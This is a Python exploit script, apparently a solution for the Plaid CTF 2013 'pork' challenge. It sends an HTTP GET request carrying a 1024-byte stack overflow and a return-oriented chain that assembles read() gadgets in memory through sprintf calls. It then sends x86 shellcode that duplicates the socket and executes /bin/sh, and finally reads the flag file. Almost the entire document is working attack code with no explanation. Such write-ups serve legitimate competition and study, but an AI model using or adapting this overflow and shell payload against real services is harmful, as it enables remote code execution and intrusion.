# Plaid CTF 2013 Pwnable pork
from err0rless import connst
from struct import pack, unpack
from time import sleep

s, t = connst("192.168.95.150", 33227)

sc = ("\x6A\x04\x5B\x6A\x29\x58\xCD\x80\x89\xC6"
      "\x31\xC9\x56\x5B\x6A\x3F\x58\xCD\x80\x41\x80"      
      "\xF9\x03\x75\xF5\x6A\x0B\x58\x99\x52\x31\xF6"      
      "\x56\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E"      
      "\x89\xE3\x31\xC9\xCD\x80")

read_gadgets = [0x804ac98,                                  # point read.plt
                0x8049a58, 0x8048b31, 0x8049910, 0x8049990, # bss + 0x50
                0x8049910, 0x8049b70, 0x8049b70, 0x8049b70, # 0x00000004
                0x8049a58, 0x8048b31, 0x8049910, 0x8049990, # bss + 0x50
                0x8049a28, 0x8049b70, 0x8049b70, 0x8049b70] # 0x00000031 // len(sc)                

def sprintf(dest, source):
    p  = pack("I", 0x0804887C) # sprintf.plt
    p += pack("I", 0x080499a7) # p-p-ret
    p += pack("I", dest)       # destination
    p += pack("I", source)     # source

    return p

def pMain():
    p  = "A" * 1024
    p += pack("I", 0x080499a5)     # p-p-p-p-ret
    p += pack("I", 0x0804ab84) * 4 # overwrite argvs
    
    bss = 0x0804AED4
    p += sprintf(bss, read_gadgets[0]) # read.plt
    bss = bss + 4

    for i in read_gadgets[1:]:
        p += sprintf(bss, i)
        bss = bss + 1

    p += pack("I", 0x080499a8) # p-ret
    p += pack("I", 0x0804AED0) # payload address
    p += pack("I", 0x08048b71) # leave ; ret
        
    s.send("GET http://" + p + " HTTP/1.1"+ "\r\n") ; sleep(0.5)
    s.send("\r\n")

    s.send(sc)
    s.send("cat /home/pork/flag\n")

    print t.read_until("\n")

if __name__ == "__main__":
    pMain()